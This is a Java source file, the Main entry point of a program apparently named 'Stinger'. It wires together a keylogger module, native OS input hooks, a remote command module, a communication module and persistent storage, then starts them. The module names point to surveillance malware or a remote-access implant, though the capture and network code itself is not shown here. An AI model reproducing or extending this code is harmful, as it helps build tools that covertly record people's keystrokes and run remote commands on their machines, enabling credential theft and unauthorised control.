package stinger;

import org.jnativehook.NativeHookException;
import stinger.comm.CommunicationModule;
import stinger.commands.CommandModule;
import stinger.logging.FileLogger;
import stinger.logging.LoggingModule;
import stinger.os.keylogger.Keylogger;
import stinger.os.keylogger.KeyloggerModule;
import stinger.os.nhooks.NativeHooks;
import stinger.os.nhooks.NativeHooksModule;
import stinger.storage.PersistentStorage;
import stinger.storage.Storage;
import stinger.storage.StorageIndex;

import java.util.Arrays;
import java.util.HashSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(Constants.CORE_THREAD_POOL_SIZE);
        try {
            StingerFiles files = new StingerFiles();

            StingerControl stingerControl = new StringerControlImpl(Thread.currentThread());
            FileLogger logger = new FileLogger(files.getLogFile());
            Storage storage = new PersistentStorage(
                    files.getStorageRoot(),
                    StorageIndex.inFile(files.getStorageIndexDbPath(), logger)
            );

            CommandModule commandModule = new CommandModule(executorService, logger);
            NativeHooksModule nativeHooksModule = new NativeHooksModule(logger);
            KeyloggerModule keyloggerModule = new KeyloggerModule(executorService);

            Stinger stinger = new Stinger(
                    new HashSet<>(Arrays.<Module>asList(
                            commandModule,
                            new CommunicationModule(executorService),
                            new LoggingModule(executorService, logger)
                    )),
                    new HashSet<>(Arrays.asList(
                            keyloggerModule,
                            nativeHooksModule
                    )),
                    new StingerEnvironmentImpl(storage, commandModule, logger, stingerControl,
                            new StingerModuleImpl(nativeHooksModule, keyloggerModule)));
            try {
                logger.info("Stinger start");
                stinger.start();
            } finally {
                stinger.stop();
                logger.info("Stinger done");
                logger.close();
            }
        } catch (Throwable t) {
            t.printStackTrace();
        } finally {
            try {
                NativeHooks.unregister();
            } catch (NativeHookException e) {
                e.printStackTrace();

            }
            executorService.shutdownNow();
        }
    }
}
